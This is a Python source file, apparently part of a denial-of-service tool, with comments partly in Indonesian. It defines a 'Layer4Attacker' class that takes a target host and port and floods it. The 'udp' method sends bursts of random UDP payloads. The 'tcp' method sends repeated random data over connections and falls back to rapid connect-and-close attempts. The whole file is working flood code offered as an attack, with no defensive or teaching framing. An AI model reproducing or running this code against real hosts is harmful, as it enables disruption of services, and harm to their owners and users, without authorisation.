#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import random
import time
import struct
from colorama import Fore

class Layer4Attacker:
    def __init__(self, target, method):
        if ':' in target:
            self.host, port = target.split(':')
            self.port = int(port)
        else:
            self.host = target
            self.port = random.choice([80, 443, 22, 21, 25, 53])
            
        self.method = method
        self.packet_count = 0
        
    def _create_udp_socket(self):
        """Create UDP socket"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Increase send buffer
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
        return sock
        
    def _create_tcp_socket(self):
        """Create TCP socket"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(3)
        return sock
        
    def _generate_random_data(self, size=1024):
        """Generate random data untuk flood"""
        return random.randbytes(size)
        
    def udp(self):
        """UDP flood attack"""
        try:
            sock = self._create_udp_socket()
            
            # Generate random payload
            payload = self._generate_random_data(random.randint(512, 1400))
            
            # Send multiple packets
            for _ in range(random.randint(10, 50)):
                try:
                    sock.sendto(payload, (self.host, self.port))
                    self.packet_count += 1
                except:
                    break
                    
            sock.close()
        except:
            pass
            
    def tcp(self):
        """TCP flood attack"""
        try:
            sock = self._create_tcp_socket()
            sock.connect((self.host, self.port))
            
            # Send SYN flood simulation
            payload = self._generate_random_data(random.randint(512, 1460))
            
            # Multiple sends
            for _ in range(random.randint(5, 20)):
                try:
                    sock.send(payload)
                    self.packet_count += 1
                except:
                    break
                    
            sock.close()
        except:
            # Fallback ke SYN flood tanpa connect
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(1)
                
                # Coba connect dan langsung close (SYN flood simulation)
                sock.connect((self.host, self.port))
                sock.close()
            except:
                pass